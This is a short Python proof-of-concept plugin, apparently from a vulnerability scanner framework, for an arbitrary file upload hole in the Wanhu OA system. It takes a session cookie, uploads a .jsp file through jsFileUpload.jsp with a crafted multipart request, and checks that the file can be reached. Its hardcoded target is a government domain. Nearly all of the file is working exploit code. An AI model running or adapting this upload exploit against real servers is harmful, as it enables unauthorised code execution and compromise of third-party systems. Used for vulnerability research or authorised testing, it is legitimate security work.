#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__= Lorin
#_PlugName= 万户oa系统上传漏洞
#_FileName_= wanhuoa_upload.py
import re
def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    payload='defaultroot/work_flow/jsFileUpload.jsp?flag=1'
    url =arg+payload
    code,head,body,errcode,fina_url=curl.curl2(arg)
    m=re.findall(r'(JSESSIONID=[^;]+);',head)
    if m:
        raw='''POST /defaultroot/work_flow/jsFileUpload.jsp?flag=1 HTTP/1.1
Host: www.gxdot.gov.cn
Content-Length: 306
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://www.gxdot.gov.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGdAZ2plNzduNYMp
Referer: http://www.gxdot.gov.cn/defaultroot/work_flow/jsFileUpload.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: %s

------WebKitFormBoundarydGdAZ2plNzduNYMp
Content-Disposition: form-data; name="photo"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_test
------WebKitFormBoundarydGdAZ2plNzduNYMp
Content-Disposition: form-data; name="submit"

sub
------WebKitFormBoundarydGdAZ2plNzduNYMp--''' %m[0]
    shell=arg+'defaultroot/devform/workflow/testvul.jsp'        
    code1,head1,body1,errcode,fina_url=curl.curl2(url,raw=raw)
    if code1 ==200:
        code2,head2,body2,errcode,fina_url=curl.curl2(shell)
        if code2== 200 and 'testvul_test' in body2:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://www.gxdot.gov.cn/')[1])